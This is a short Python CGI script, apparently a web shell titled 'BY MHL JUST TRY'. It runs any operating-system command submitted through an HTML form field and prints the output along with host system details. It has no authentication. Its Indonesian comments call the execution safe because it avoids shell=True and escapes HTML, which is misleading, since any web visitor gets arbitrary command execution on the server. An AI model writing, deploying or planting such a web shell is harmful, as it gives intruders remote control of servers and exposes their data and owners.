#!/usr/bin/env python3
import cgi
import html
import os
import re
import sys
import subprocess

form = cgi.FieldStorage()
cmd = form.getvalue('cmd', '')

# Jalankan perintah dengan aman
try:
    # Jangan gunakan shell=True untuk keamanan
    if cmd.strip():
        result = subprocess.run(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout + result.stderr
    else:
        output = "Perintah kosong."
except Exception as e:
    output = f"Error saat menjalankan perintah: {e}"

# Escape HTML untuk menghindari XSS
escaped_output = html.escape(output)

# Informasi sistem
try:
    osinf = os.uname()
    info = f"System : {osinf.sysname} {osinf.release} {osinf.version} {osinf.machine}"
except AttributeError:
    info = "System info tidak tersedia di platform ini."

# Ambil nama file program
dirt = os.getcwd() + '/'
prognm = os.path.abspath(sys.argv[0]).strip()
progfl_match = re.findall(re.escape(dirt) + r'(.*)', prognm)
progfl = progfl_match[0] if progfl_match else prognm

# Output HTML
print("Content-type: text/html\n")
print(f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>BY MHL JUST TRY</title>
</head>
<body onload="document.getElementById('c').focus()">
    <pre>{html.escape(info)}</pre>
    <form method="post" action="{html.escape(progfl)}">
        Command <input type="text" id="c" name="cmd" autofocus>
        <input type="submit" value="Run">
    </form>
    <pre>{escaped_output}</pre>
</body>
</html>
""")
